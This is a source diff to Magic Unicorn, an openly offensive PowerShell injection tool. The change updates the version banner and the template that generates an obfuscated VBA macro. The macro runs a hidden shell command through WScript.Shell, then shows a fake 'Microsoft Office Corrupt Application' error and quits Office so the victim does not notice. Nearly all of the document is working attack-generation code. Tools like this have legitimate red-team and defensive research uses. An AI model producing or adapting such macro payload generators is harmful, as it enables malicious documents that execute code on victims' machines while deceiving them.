@@ -218,7 +218,7 @@ The last one will use a 500 character string instead of the default 380, resulti
 # usage banner
 def gen_usage():
     print(
-        "-------------------- Magic Unicorn Attack Vector v2.7.4 -----------------------------")
+        "-------------------- Magic Unicorn Attack Vector v2.7.5 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print(
         "Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
@@ -336,11 +336,8 @@ def generate_macro(full_attack, line_length=380):
     function6 = generate_random_string(5, 15)
 
     # our final product of obfsucated code
-    macro_str += ("""\n\nDim {0}\n{1} = {2}\nDim {3}\n{4} = {5}\nDim {6}\n{7} = {8} & "." & {9}\nDim {10}\nDim {11}\nSet {12} = VBA.CreateObject({13})\n{14} = {15} & " "\n{16} = {17}.Run({18} & {19}, 0, False)\nDim title As String\ntitle = "Microsoft Corrupt Document"\nDim msg As String\nDim intResponse As Integer\nmsg = "This application appears to be made on an older version of the Microsoft Office product suite. Please have the author save a newer and supported version format. [Error No. 1796]"\nintResponse = MsgBox(msg, 16, title)\nApplication.Quit\nEnd Sub""".format(
-        function1, function1, shell, function2, function2, wscript, function3, function3, function2, function1, function4, function5, function4, function3, function6, ps_long, function5, function4, function6, macro_rand))
-
+    macro_str += ("""\n\nDim {0}\n{1} = {2}\nDim {3}\n{4} = {5}\nDim {6}\n{7} = {8} & "." & {9}\nDim {10}\nDim {11}\nSet {12} = VBA.CreateObject({13})\nDim {14}\n{14} = {15} & " "\n{16} = {17}.Run({18} & {19}, 0, False)\nDim title As String\ntitle = "Microsoft Office Corrupt Application (Compatibility Mode)"\nDim msg As String\nDim intResponse As Integer\nmsg = "This application appears to be made on an older version of the Microsoft Office product suite. Please have the author save to a newer and supported format. [Error Code: -219]"\nintResponse = MsgBox(msg, 16, title)\nApplication.Quit\nEnd Sub""".format(function1, function1, shell, function2, function2, wscript, function3, function3, function2, function1, function4, function5, function4, function3, function6, ps_long, function5, function4, function6, macro_rand))
     return macro_str
-
 
 # generate Matthew Graeber's (Matt rocks) attack for binary to cert format #KeepMattHappy
 # - https://gist.github.com/mattifestation/47f9e8a431f96a266522
